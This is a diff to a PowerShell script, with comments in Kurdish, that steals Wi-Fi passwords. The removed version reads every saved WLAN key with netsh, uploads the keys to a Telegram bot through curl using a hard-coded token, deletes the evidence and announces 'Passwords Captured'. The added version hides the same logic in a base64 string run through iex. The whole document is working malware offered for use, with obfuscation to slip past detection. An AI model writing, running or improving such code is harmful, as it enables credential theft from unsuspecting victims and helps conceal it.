@@ -1,23 +1,2 @@
-$t = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
-$i = "8597805144"
-$p = "$env:TEMP\w.txt"
-
-if (Test-Path $p) { Remove-Item $p -Force }
-
-# دۆزینەوەی پاسۆردەکان بە شێوازێکی سادەتر
-$nets = netsh wlan show profiles | Select-String "\:(.+)$"
-foreach ($n in $nets) {
-    $name = $n.Matches.Groups[1].Value.Trim()
-    $conf = netsh wlan show profile name="$name" key=clear
-    $pass = ($conf | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
-    if ($pass) { "$name : $pass" | Out-File $p -Append }
-}
-
-if (Test-Path $p) {
-    curl.exe -F "document=@$p" "https://api.telegram.org/bot$t/sendDocument?chat_id=$i"
-    Remove-Item $p -Force
-}
-
-# بەشی قسەکردنەکە
-$s = New-Object -ComObject SAPI.SpVoice
-$s.Speak("Passwords Captured Successfully")
+$b = "JHQ9IjgwNTU0Mzk4Nzc6QUFIcFB5eVk3OXB1dEx5eENEYTNiRUQ3S0h0RFdvMVQ4MCI7JGk9Ijg1OTc4MDUxNDQiOyRwPSIkZW52OlRFTVBcdy50eHQiO2lmKFRlc3QtUGF0aCAkcCl7Um1vdmUtSXRlbSAkcCAtRm9yY2V9OyRuZXRzPW5ldHNoIHdsYW4gc2hvdyBwcm9maWxlc3xTZWxlY3QtU3RyaW5nICJcOiguKykkiDtmb3JlYWNoKCRuIGluICRuZXRzKXskbmFtZT0kbi5NYXRjaGVzLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCk7JGNvbmY9bmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgbmFtZT0iJG5hbWUiIGtleT1jbGVhcjskbWF0Y2g9JGNvbmZ8U2VsZWN0LVN0cmluZyAiS2V5IENvbnRlbnRcVytcOiguKykkiDtpZigkbWF0Y2gpeyRwYXNzPSRtYXRjaC5NYXRjaGVzLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCk7IiRuYW1lIDogJHBhc3MifE91dC1GaWxlICRwIC1BcHBlbmR9fTtpZihUZXN0LVBhdGggJHApe2N1cmwuZXhlIC1GICJkb2N1bWVudD1AJHAiICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHQvc2VuZERvY3VtZW50P2NoYXRfaWQ9JGkiO1Jtb3ZlLUl0ZW0gJHAgLUZvcmNlfTskcz1OZXctT2JqZWN0IC1Db21PYmplY3QgU0FQSS5TcFZvaWNlOyRzLlNwZWFrKCJQYXNzd29yZHMgQ2FwdHVyZWQiKQ=="
+iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b)))
